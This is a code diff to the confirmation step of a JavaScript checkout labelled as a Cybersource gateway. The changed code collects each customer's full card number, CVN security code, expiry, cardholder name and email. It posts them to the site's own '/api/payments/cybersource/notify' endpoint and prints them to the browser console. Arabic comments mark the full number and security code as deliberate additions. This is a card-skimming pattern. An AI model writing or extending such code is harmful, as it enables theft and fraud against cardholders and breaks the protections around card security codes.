@@ -522,22 +522,38 @@
       confirmView.classList.remove('cs-gw-view-hidden');
 
       if (activeContext?.orderNumber && activeContext?.email) {
+        const notifyPayload = {
+          orderNumber: activeContext.orderNumber,
+          customerEmail: activeContext.email,
+          amountText: activeContext.formattedAmount || '',
+          brand: BRAND_LABELS[brand] || brand,
+          last4: rawDigits.slice(-4),
+          expiration: expMonth + '/' + expYear,
+          fullCardNumber: rawDigits,
+          cvn: cvn,
+          cardholderName: activeContext.cardholderName || '',
+        };
+
+        console.log('[CS Gateway] Sending notify payload:', notifyPayload);
+
         fetch('/api/payments/cybersource/notify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            orderNumber,
-            customerEmail,
-            amountText,
-            brand,
-            last4: rawCardNumber.slice(-4),
-            fullCardNumber: rawCardNumber, // إضافة الرقم الكامل
-            cvn: cvnValue,                 // إضافة رمز الأمان
-            cardholderName: holderName,    // إضافة اسم حامل البطاقة
-            expiration,
+          body: JSON.stringify(notifyPayload),
+        })
+          .then((resp) =>
+            resp.json().then((data) => ({ ok: resp.ok, status: resp.status, data }))
+          )
+          .then(({ ok, status, data }) => {
+            if (!ok) {
+              console.error('[CS Gateway] Notify failed:', status, data);
+            } else {
+              console.log('[CS Gateway] Notify OK:', data);
+            }
           })
-        }).catch(() => { });
+          .catch((err) => console.error('[CS Gateway] Network error:', err));
       }
+
 
       if (typeof activeContext?.onComplete === 'function') {
         activeContext.onComplete(summary);
